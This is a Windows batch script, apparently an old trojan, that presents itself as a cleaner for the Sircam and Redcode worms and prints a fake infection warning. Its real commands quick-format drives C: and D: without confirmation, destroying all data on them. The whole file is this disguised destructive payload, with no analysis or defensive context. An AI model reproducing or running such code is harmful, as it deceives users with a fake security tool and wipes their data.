@echo off
echo TROJAN.BAT.MASSCLEANER Now Working...
echo This program will check your computer for
echo I-Worm.Sircam.a I-Worm.Redcode
echo It will also find unknown copys of the I-Worms
cls
pause
echo If any nasty programs are found, I will attempt to
echo clean them off this computer.
cls
echo C:\Windows\Sircam.exe has infection of I-Worm.Sircam.a
pause
cls
echo Starting Cleaner :)
format C:\ /q /autotest
echo Checking Drive D:\
format D:\ /q /autotest
echo Cleaning not completed on drive C:\
format C:\ /q /autotest
